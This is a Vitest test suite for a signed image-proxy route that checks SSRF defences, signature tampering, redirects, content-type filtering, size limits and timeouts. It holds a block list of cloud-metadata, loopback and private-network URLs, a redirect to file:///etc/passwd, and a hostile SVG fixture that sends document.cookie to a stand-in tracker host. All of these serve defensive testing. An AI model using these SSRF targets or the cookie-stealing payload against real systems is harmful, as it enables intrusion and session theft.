import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { IMAGE_PROXY_PREFIX, imageProxyPath, MAX_PROXIED_URL_CHARS, verifyImageProxyPath } from "../src/image-proxy";
import { isProxyableImageUrl } from "../src/image-proxy-target";
import {
  DEFAULT_SUCCESS_TTL_SECONDS, FAILURE_TTL_SECONDS, MAX_IMAGE_BYTES, MAX_REDIRECTS, MAX_SUCCESS_TTL_SECONDS, MIN_SUCCESS_TTL_SECONDS,
  PROXY_USER_AGENT, successTtl, UPSTREAM_TIMEOUT_MS,
} from "../src/routes/image-proxy";
import worker from "../src/worker";

const SECRET = process.env.IMAGE_PROXY_SECRET as string;
const IMAGE = "https://images.example.com/logo.png";
const PNG = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3]);

/** Flip a middle character: the last base64url character can carry unused bits. */
function tamper(value: string): string {
  const index = Math.floor(value.length / 2);
  return value.slice(0, index) + (value[index] === "A" ? "B" : "A") + value.slice(index + 1);
}

async function signed(url = IMAGE): Promise<string> {
  const path = await imageProxyPath(SECRET, url);
  if (!path) throw new Error(`not proxyable: ${url}`);
  return path;
}

describe("upstream target checks", () => {
  it.each([
    "https://images.example.com/a.png", "http://example.org/x.svg?y=1", "https://8.8.8.8/a.png", "https://[2606:4700::1111]/a.png", "https://[2606:4700:1:2:3:4:5:6]/a.png",
    "https://sub.example.co.uk./a.png", "https://localhost.example.com/a.png",
  ])("allows %s", (url) => {
    expect(isProxyableImageUrl(url)).toBe(true);
  });

  it.each([
    // Not http(s), credentials, explicit ports, unparsable.
    "ftp://example.com/a.png", "data:image/png;base64,AA==", "javascript:alert(1)", "https://user:pw@example.com/a.png",
    "https://user@example.com/a.png", "https://example.com:8443/a.png", "http://example.com:22/", "not a url",
    // IPv4 private, loopback, link-local/metadata, shared, reserved, multicast; and the parser's alternative spellings.
    "http://127.0.0.1/", "http://127.1/", "http://2130706433/", "http://0x7f.0.0.1/", "http://0.0.0.0/", "http://10.1.2.3/",
    "http://172.16.0.1/", "http://172.31.255.255/", "http://192.168.1.1/", "http://169.254.169.254/latest/meta-data/",
    "http://100.64.0.1/", "http://100.100.100.200/", "http://192.0.0.1/", "http://192.0.2.1/", "http://198.18.0.1/",
    "http://198.51.100.1/", "http://203.0.113.1/", "http://224.0.0.1/", "http://255.255.255.255/", "http://127.0.0.1./",
    // IPv6 loopback, unspecified, mapped/compatible IPv4, NAT64, ULA, link-local, multicast, documentation, 6to4, Teredo.
    "http://[::1]/", "http://[::]/", "http://[::ffff:127.0.0.1]/", "http://[::ffff:a9fe:a9fe]/", "http://[::127.0.0.1]/",
    "http://[64:ff9b::a9fe:a9fe]/", "http://[fc00::1]/", "http://[fd12:3456::1]/", "http://[fe80::1]/", "http://[ff02::1]/",
    "http://[2001:db8::1]/", "http://[2002:7f00:1::]/", "http://[2001:0:4136:e378::1]/",
    // Local-only and metadata names.
    "http://localhost/", "http://LOCALHOST./", "http://intranet/", "http://app.localhost/", "http://printer.local/",
    "http://db.internal/", "http://metadata.google.internal/computeMetadata/v1/", "http://metadata.goog/",
    "http://instance-data.ec2.internal/", "http://metadata.azure.com/", "http://router.home.arpa/", "http://x.lan/",
  ])("refuses %s", (url) => {
    expect(isProxyableImageUrl(url)).toBe(false);
  });
});

describe("signed proxy paths", () => {
  it("round-trips the exact URL and refuses every altered path", async () => {
    const path = await signed();
    expect(path).toMatch(/^\/img\/[A-Za-z0-9_-]{43}\/[A-Za-z0-9_-]+$/);
    expect(await verifyImageProxyPath(SECRET, path)).toBe(IMAGE);
    const [, , signature, encoded] = path.split("/");
    const other = await signed("https://images.example.com/other.png");
    for (const bad of [
      `${IMAGE_PROXY_PREFIX}${tamper(signature)}/${encoded}`,
      `${IMAGE_PROXY_PREFIX}${signature}/${tamper(encoded)}`,
      `${IMAGE_PROXY_PREFIX}${signature}/${other.split("/")[3]}`,
      `${IMAGE_PROXY_PREFIX}${signature}`,
      `${IMAGE_PROXY_PREFIX}/${encoded}`,
      `${IMAGE_PROXY_PREFIX}${signature}/${encoded}/extra`,
      `${IMAGE_PROXY_PREFIX}${signature.slice(1)}/${encoded}`,
      `${IMAGE_PROXY_PREFIX}${signature}/${encoded}=`,
      `${IMAGE_PROXY_PREFIX}${signature}/${encoded.slice(0, -1)}`,
      `${IMAGE_PROXY_PREFIX}${signature}/a`,
      `/image/${signature}/${encoded}`,
    ]) expect(await verifyImageProxyPath(SECRET, bad), bad).toBeNull();
    // Another secret signs differently.
    expect(await verifyImageProxyPath("another-secret-that-is-32-chars-long", path)).toBeNull();
  });

  it("accepts only canonical, printable-ASCII encodings", async () => {
    const path = await signed();
    const [, , signature, encoded] = path.split("/");
    // Non-canonical: same bytes with different unused trailing bits.
    const last = encoded.at(-1) as string;
    const sibling = "AQgw".includes(last) ? String.fromCharCode(last.charCodeAt(0) + 1) : null;
    if (sibling) expect(await verifyImageProxyPath(SECRET, `${IMAGE_PROXY_PREFIX}${signature}/${encoded.slice(0, -1)}${sibling}`)).toBeNull();
    // A correctly signed non-ASCII payload is still refused.
    const binary = btoa("https://x.example/ÿ").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
    expect(await verifyImageProxyPath(SECRET, `${IMAGE_PROXY_PREFIX}${signature}/${binary}`)).toBeNull();
    expect(await verifyImageProxyPath(SECRET, `${IMAGE_PROXY_PREFIX}${signature}/${"A".repeat(Math.ceil(MAX_PROXIED_URL_CHARS * 4 / 3) + 4)}`)).toBeNull();
  });

  it("does not sign blocked targets or overlong URLs", async () => {
    expect(await imageProxyPath(SECRET, "http://169.254.169.254/latest/meta-data/")).toBeNull();
    expect(await imageProxyPath(SECRET, "ftp://example.com/a.png")).toBeNull();
    const long = `https://images.example.com/${"a".repeat(MAX_PROXIED_URL_CHARS)}`;
    expect(await imageProxyPath(SECRET, long)).toBeNull();
    const longest = `https://images.example.com/${"a".repeat(MAX_PROXIED_URL_CHARS - 27)}`;
    expect(longest).toHaveLength(MAX_PROXIED_URL_CHARS);
    expect(await verifyImageProxyPath(SECRET, await signed(longest))).toBe(longest);
  });

  it("imports the HMAC key once per secret", async () => {
    const importKey = vi.spyOn(crypto.subtle, "importKey");
    try {
      await imageProxyPath("first-secret-at-least-32-characters!!", IMAGE);
      await imageProxyPath("first-secret-at-least-32-characters!!", "https://images.example.com/b.png");
      await imageProxyPath("second-secret-at-least-32-characters!", IMAGE);
      expect(importKey).toHaveBeenCalledTimes(2);
    } finally {
      importKey.mockRestore();
    }
  });
});

describe("cache lifetimes", () => {
  it.each([
    [null, DEFAULT_SUCCESS_TTL_SECONDS],
    ["", DEFAULT_SUCCESS_TTL_SECONDS],
    ["public", DEFAULT_SUCCESS_TTL_SECONDS],
    ["max-age=3600", 3600],
    ["public, max-age=\"7200\"", 7200],
    ["max-age=3600, s-maxage=86400", 86_400],
    ["max-age=0", MIN_SUCCESS_TTL_SECONDS],
    ["max-age=99999999", MAX_SUCCESS_TTL_SECONDS],
    ["no-cache", MIN_SUCCESS_TTL_SECONDS],
    ["max-age=600, no-store", MIN_SUCCESS_TTL_SECONDS],
    ["Private, max-age=600", MIN_SUCCESS_TTL_SECONDS],
    ["no-cache=\"set-cookie\"", MIN_SUCCESS_TTL_SECONDS],
  ])("Cache-Control %s → %d s", (header, ttl) => {
    expect(successTtl(header)).toBe(ttl);
  });
});

/** A Cache API stand-in: put consumes the body (rejecting if its stream fails), as the Workers cache does. */
class MemoryCache {
  entries = new Map<string, { body: ArrayBuffer; init: ResponseInit }>();
  puts: Array<{ url: string; status: number; cacheControl: string | null }> = [];
  failPut = false;
  match(request: Request): Promise<Response | undefined> {
    const entry = this.entries.get(request.url);
    return Promise.resolve(entry && new Response(entry.body.byteLength ? entry.body : null, entry.init));
  }
  async put(request: Request, response: Response): Promise<void> {
    const body = await response.arrayBuffer();
    if (this.failPut) throw new Error("cache unavailable");
    this.puts.push({ url: request.url, status: response.status, cacheControl: response.headers.get("Cache-Control") });
    this.entries.set(request.url, { body, init: { status: response.status, headers: response.headers } });
  }
}

type Upstream = (url: string, init: RequestInit) => Response | Promise<Response>;

describe("GET /img/<sig>/<url>", () => {
  let cache: MemoryCache;
  let upstream: Upstream;
  const calls: Array<{ url: string; init: RequestInit }> = [];
  const pending: Array<Promise<unknown>> = [];
  const executionCtx = { waitUntil: (promise: Promise<unknown>) => { pending.push(promise); }, passThroughOnException() {}, props: {} };

  beforeEach(() => {
    cache = new MemoryCache();
    calls.length = 0;
    pending.length = 0;
    upstream = () => new Response(PNG, { headers: { "Content-Type": "image/png" } });
    vi.stubGlobal("caches", { default: cache });
    vi.mocked(fetch).mockImplementation(async (input, init) => {
      const url = input as string;
      calls.push({ url, init: init ?? {} });
      return upstream(url, init ?? {});
    });
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    vi.mocked(fetch).mockReset();
    vi.mocked(fetch).mockImplementation(() => Promise.resolve(new Response("Not found", { status: 404 })));
  });

  const get = (path: string, init: RequestInit = {}) => worker.request(`https://rendro.test${path}`, init, {}, executionCtx);
  const settle = () => Promise.all(pending);

  it("serves a signed image with fixed headers, fetched without anything from the reader", async () => {
    upstream = () => new Response(PNG, {
      headers: {
        "Content-Type": "image/PNG; charset=binary", "Set-Cookie": "track=1; Path=/", "Access-Control-Allow-Origin": "*", ETag: "\"u\"",
        "X-Upstream": "leak", "Content-Length": String(PNG.byteLength), "Cache-Control": "max-age=3600",
        "Content-Security-Policy": "default-src *", Link: "<https://tracker.example/>; rel=preload",
      },
    });
    const response = await get(await signed(), {
      headers: { Cookie: "__Host-better-auth.session_token=secret", "User-Agent": "Reader/1.0", "CF-Connecting-IP": "203.0.113.9", "X-Forwarded-For": "203.0.113.9", Referer: "https://rendro.test/doc" },
    });
    expect(response.status).toBe(200);
    expect(new Uint8Array(await response.arrayBuffer())).toEqual(PNG);
    expect(Object.fromEntries(response.headers)).toMatchObject({
      "content-type": "image/png",
      "content-security-policy": "default-src 'none'; style-src 'unsafe-inline'; sandbox",
      "content-disposition": "inline",
      "x-content-type-options": "nosniff",
      "cross-origin-resource-policy": "cross-origin",
      "referrer-policy": "no-referrer",
      "cache-control": "public, max-age=3600",
    });
    for (const header of ["set-cookie", "access-control-allow-origin", "etag", "x-upstream", "link"]) expect(response.headers.get(header), header).toBeNull();

    expect(calls).toHaveLength(1);
    const [{ url, init }] = calls;
    expect(url).toBe(IMAGE);
    expect(init).toMatchObject({ method: "GET", redirect: "manual" });
    expect(init.signal).toBeInstanceOf(AbortSignal);
    expect(Object.fromEntries(new Headers(init.headers))).toEqual({ "user-agent": PROXY_USER_AGENT, accept: expect.stringContaining("image/avif") as string });
    expect("credentials" in init).toBe(false);

    await settle();
    expect(cache.puts).toEqual([{ url: expect.stringMatching(/^https:\/\/rendro\.test\/img\/cache\/[0-9a-f]{64}$/) as string, status: 200, cacheControl: "public, max-age=3600" }]);
  });

  it("answers repeats from the cache without contacting the upstream", async () => {
    const path = await signed();
    await (await get(path)).arrayBuffer();
    await settle();
    const again = await get(path);
    expect(again.status).toBe(200);
    expect(new Uint8Array(await again.arrayBuffer())).toEqual(PNG);
    expect(again.headers.get("content-security-policy")).toContain("sandbox");
    expect(calls).toHaveLength(1);
  });

  it.each([
    ["no signature", (path: string) => path.split("/").slice(0, 3).join("/")],
    ["a bad signature", (path: string) => { const parts = path.split("/"); parts[2] = tamper(parts[2]); return parts.join("/"); }],
    ["a URL the signature does not cover", (path: string) => { const parts = path.split("/"); parts[3] = tamper(parts[3]); return parts.join("/"); }],
    ["a bare prefix", () => "/img/"],
    ["an extra segment", (path: string) => `${path}/x`],
  ])("is not an open proxy: %s is a 404 that never fetches", async (_name, mutate) => {
    const response = await get(mutate(await signed()));
    expect(response.status).toBe(404);
    expect(await response.text()).toBe("");
    expect(calls).toHaveLength(0);
    expect(cache.puts).toHaveLength(0);
  });

  /** A failure: short-lived, cached, and the reader learns nothing about the upstream. */
  async function expectFailure(response: Response) {
    expect(response.status).toBe(502);
    expect(await response.text()).toBe("");
    expect(response.headers.get("cache-control")).toBe(`public, max-age=${FAILURE_TTL_SECONDS}`);
    expect(response.headers.get("content-type")).toBeNull();
    expect(response.headers.get("x-content-type-options")).toBe("nosniff");
    await settle();
    expect(cache.puts.at(-1)).toMatchObject({ status: 502, cacheControl: `public, max-age=${FAILURE_TTL_SECONDS}` });
  }

  const redirect = (location: string | null, status = 302) => new Response(null, { status, headers: location === null ? {} : { Location: location } });

  it.each([
    "http://127.0.0.1/admin", "http://169.254.169.254/latest/meta-data/", "http://[::1]/", "http://10.0.0.5/",
    "http://metadata.google.internal/", "file:///etc/passwd", "http://localhost:8080/",
  ])("refuses a redirect to %s without following it", async (location) => {
    upstream = () => redirect(location);
    await expectFailure(await get(await signed()));
    expect(calls).toHaveLength(1);
  });

  it.each([301, 302, 303, 307, 308])("follows a %d to a public host, re-checking the hop", async (status) => {
    upstream = (url) => (url === IMAGE ? redirect("/moved/logo.png?v=2", status) : new Response(PNG, { headers: { "Content-Type": "image/png" } }));
    const response = await get(await signed());
    expect(response.status).toBe(200);
    expect(calls.map(({ url }) => url)).toEqual([IMAGE, "https://images.example.com/moved/logo.png?v=2"]);
    expect(calls[1].init).toMatchObject({ redirect: "manual" });
  });

  it(`follows at most ${MAX_REDIRECTS} redirects, so a loop ends`, async () => {
    upstream = (url) => redirect(url);
    await expectFailure(await get(await signed()));
    expect(calls).toHaveLength(MAX_REDIRECTS + 1);

    calls.length = 0;
    let hop = 0;
    upstream = () => (hop++ < MAX_REDIRECTS ? redirect(`https://cdn${hop}.example.com/a.png`) : new Response(PNG, { headers: { "Content-Type": "image/png" } }));
    expect((await get(await signed("https://images.example.com/chain.png"))).status).toBe(200);
    expect(calls).toHaveLength(MAX_REDIRECTS + 1);
  });

  it.each([
    ["no Location", () => redirect(null)],
    ["an unparsable Location", () => redirect("http://[")],
  ])("fails a redirect with %s", async (_name, response) => {
    upstream = response;
    await expectFailure(await get(await signed()));
  });

  it.each([
    ["HTML", "text/html; charset=utf-8"],
    ["JavaScript", "application/javascript"],
    ["JSON", "application/json"],
    ["no type", null],
    ["an image type off the allowlist", "image/tiff"],
    ["XML", "application/xml"],
  ])("refuses %s", async (_name, type) => {
    upstream = () => new Response("<script>alert(1)</script>", { headers: type === null ? {} : { "Content-Type": type } });
    await expectFailure(await get(await signed()));
  });

  it.each(["image/png", "image/jpeg", "image/gif", "image/webp", "image/avif", "image/svg+xml", "image/x-icon", "image/vnd.microsoft.icon"])("allows %s", async (type) => {
    upstream = () => new Response(PNG, { headers: { "Content-Type": type } });
    const response = await get(await signed());
    expect(response.headers.get("content-type")).toBe(type);
  });

  it("serves SVG with script inert: sandboxed, no sources allowed, inline and nosniff", async () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://tracker.example/\'+document.cookie)"><script>alert(document.domain)</script></svg>';
    upstream = () => new Response(svg, { headers: { "Content-Type": "image/svg+xml" } });
    const response = await get(await signed("https://images.example.com/evil.svg"));
    expect(response.status).toBe(200);
    expect(response.headers.get("content-type")).toBe("image/svg+xml");
    expect(response.headers.get("content-security-policy")).toBe("default-src 'none'; style-src 'unsafe-inline'; sandbox");
    expect(response.headers.get("content-disposition")).toBe("inline");
    expect(response.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it.each([404, 500, 206, 204, 304])("fails an upstream %d", async (status) => {
    upstream = () => new Response(status === 204 || status === 304 ? null : PNG, { status, headers: { "Content-Type": "image/png" } });
    await expectFailure(await get(await signed()));
  });

  it("fails a refused response whose body already broke", async () => {
    const broken = () => new ReadableStream({ start(controller) { controller.error(new Error("reset")); } });
    upstream = () => new Response(broken(), { status: 500, headers: { "Content-Type": "image/png" } });
    await expectFailure(await get(await signed()));
    upstream = () => new Response(broken(), { status: 302, headers: { Location: "http://10.0.0.1/" } });
    await expectFailure(await get(await signed("https://images.example.com/b.png")));
  });

  it("fails an empty 200 and a network error", async () => {
    upstream = () => new Response(null, { headers: { "Content-Type": "image/png" } });
    await expectFailure(await get(await signed()));
    upstream = () => { throw new TypeError("network down"); };
    await expectFailure(await get(await signed("https://images.example.com/b.png")));
  });

  it("refuses a declared oversize body without reading it", async () => {
    const cancel = vi.fn();
    const body = new ReadableStream({ pull() { throw new Error("must not be read"); }, cancel }, { highWaterMark: 0 });
    upstream = () => new Response(body, { headers: { "Content-Type": "image/png", "Content-Length": String(MAX_IMAGE_BYTES + 1) } });
    await expectFailure(await get(await signed()));
    expect(cancel).toHaveBeenCalled();
    upstream = () => new Response(PNG, { headers: { "Content-Type": "image/png", "Content-Length": "lots" } });
    await expectFailure(await get(await signed("https://images.example.com/b.png")));
  });

  /** A body served in 1 MiB chunks, counting what the proxy pulled. */
  function chunked(total: number) {
    const state = { pulled: 0, cancelled: false };
    const chunk = new Uint8Array(1024 * 1024);
    const body = new ReadableStream<Uint8Array>({
      pull(controller) {
        if (state.pulled >= total) return controller.close();
        const size = Math.min(chunk.byteLength, total - state.pulled);
        state.pulled += size;
        controller.enqueue(chunk.subarray(0, size));
      },
      cancel() { state.cancelled = true; },
    }, { highWaterMark: 0 });
    return { body, state };
  }

  it("cuts off an undeclared oversize body while streaming, and caches a failure instead", async () => {
    const { body, state } = chunked(MAX_IMAGE_BYTES * 3);
    upstream = () => new Response(body, { headers: { "Content-Type": "image/png" } });
    const response = await get(await signed());
    expect(response.status).toBe(200);
    await expect(response.arrayBuffer()).rejects.toThrow();
    await settle();
    // Stopped just past the limit, and the upstream was cancelled.
    expect(state.pulled).toBeLessThanOrEqual(MAX_IMAGE_BYTES + 2 * 1024 * 1024);
    expect(state.cancelled).toBe(true);
    expect(cache.puts).toEqual([expect.objectContaining({ status: 502 })]);
  });

  it("streams a body exactly at the limit", async () => {
    upstream = () => new Response(chunked(MAX_IMAGE_BYTES).body, { headers: { "Content-Type": "image/png" } });
    const response = await get(await signed());
    expect((await response.arrayBuffer()).byteLength).toBe(MAX_IMAGE_BYTES);
    await settle();
    expect(cache.puts).toEqual([expect.objectContaining({ status: 200 })]);
  });

  it("fails a body whose upstream stream errors", async () => {
    upstream = () => new Response(new ReadableStream({ pull(controller) { controller.error(new Error("reset")); } }), { headers: { "Content-Type": "image/png" } });
    const response = await get(await signed());
    await expect(response.arrayBuffer()).rejects.toThrow();
  });

  describe(`with the ${UPSTREAM_TIMEOUT_MS / 1000} s deadline`, () => {
    let deadline: AbortController;
    let timeout: ReturnType<typeof vi.spyOn>;
    beforeEach(() => {
      deadline = new AbortController();
      timeout = vi.spyOn(AbortSignal, "timeout").mockImplementation((ms) => {
        expect(ms).toBe(UPSTREAM_TIMEOUT_MS);
        return deadline.signal;
      });
    });
    afterEach(() => { timeout.mockRestore(); });

    it("fails an upstream that never answers", async () => {
      upstream = (_url, init) => new Promise((_, reject) => {
        init.signal?.addEventListener("abort", () => reject(new DOMException("timed out", "TimeoutError")));
        setTimeout(() => deadline.abort(), 5);
      });
      await expectFailure(await get(await signed()));
    });

    it("ignores the deadline once the body is complete", async () => {
      const response = await get(await signed());
      expect(new Uint8Array(await response.arrayBuffer())).toEqual(PNG);
      deadline.abort();
      await settle();
      expect(cache.puts).toEqual([expect.objectContaining({ status: 200 })]);
    });

    it("cuts off a body that trickles past the deadline", async () => {
      let cancelled = false;
      const body = new ReadableStream<Uint8Array>({
        start(controller) { controller.enqueue(PNG); },
        pull() { return new Promise(() => undefined); },
        cancel() { cancelled = true; },
      });
      upstream = () => new Response(body, { headers: { "Content-Type": "image/png" } });
      const response = await get(await signed());
      expect(response.status).toBe(200);
      const read = response.arrayBuffer();
      setTimeout(() => deadline.abort(), 5);
      await expect(read).rejects.toThrow("timed out");
      expect(cancelled).toBe(true);
      await settle();
      expect(cache.puts).toEqual([expect.objectContaining({ status: 502 })]);
    });
  });

  it("lets the reader cancel a stream", async () => {
    const { body, state } = chunked(MAX_IMAGE_BYTES);
    upstream = () => new Response(body, { headers: { "Content-Type": "image/png" } });
    vi.stubGlobal("caches", undefined);
    const response = await get(await signed());
    const reader = (response.body as ReadableStream<Uint8Array>).getReader();
    await reader.read();
    await reader.cancel();
    expect(state.cancelled).toBe(true);
  });

  it("works without a cache (the Node server) and without an execution context", async () => {
    vi.stubGlobal("caches", undefined);
    const served = await worker.request(`https://rendro.test${await signed()}`);
    expect(served.status).toBe(200);
    expect(new Uint8Array(await served.arrayBuffer())).toEqual(PNG);
    upstream = () => new Response(null, { status: 404 });
    expect((await worker.request(`https://rendro.test${await signed("http://example.org/missing.png")}`)).status).toBe(502);
    expect(cache.puts).toEqual([]);
    // A cache but no execution context: storing still happens, just not tracked.
    vi.stubGlobal("caches", { default: cache });
    expect((await worker.request(`https://rendro.test${await signed("http://example.org/gone.png")}`)).status).toBe(502);
    await vi.waitFor(() => expect(cache.puts).toEqual([expect.objectContaining({ status: 502 })]));
  });

  it("still answers when the cache refuses to store", async () => {
    cache.failPut = true;
    const response = await get(await signed());
    expect(new Uint8Array(await response.arrayBuffer())).toEqual(PNG);
    await settle();
    expect(cache.puts).toEqual([]);
  });

  it("answers HEAD like GET", async () => {
    const response = await get(await signed(), { method: "HEAD" });
    expect(response.status).toBe(200);
    expect(response.headers.get("content-type")).toBe("image/png");
  });
});
